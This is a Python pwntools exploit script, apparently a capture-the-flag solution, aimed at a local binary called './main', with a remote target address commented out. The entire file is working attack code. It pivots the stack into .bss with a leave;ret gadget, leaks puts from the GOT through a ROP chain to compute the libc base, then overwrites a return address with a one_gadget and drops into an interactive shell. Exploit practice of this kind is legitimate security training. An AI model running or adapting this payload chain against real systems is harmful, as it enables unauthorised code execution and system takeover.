from pwn import *

#context(os='linux', arch='amd64',log_level='debug')

p = process('./main')
#p=remote("101.71.29.5",10038)
def g(p):
    gdb.attach(p)
    raw_input()

pop_rdi_ret=0x4007a3
puts_got=0x601018
puts_plt=0x400520
main=0x4006c3
name=0x601080
bss=name+0x100
leave_ret=0x400733


p.recvuntil("Input Your Name:\n")
payload1="1"*0x100+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
p.send(payload1)

p.recvuntil("Input Buffer:\n")
payload2="1"*0x40+p64(bss)+p64(leave_ret)
p.send(payload2)

libc=u64(p.recv(6).ljust(0x8,"\x00"))-0x6f690
print hex(libc)
one=libc+0xf1147

p.recvuntil("Input Your Name:\n")
p.send("1111")
p.recvuntil("Input Buffer:\n")
p.send("2"*0x48+p64(one))

p.interactive()
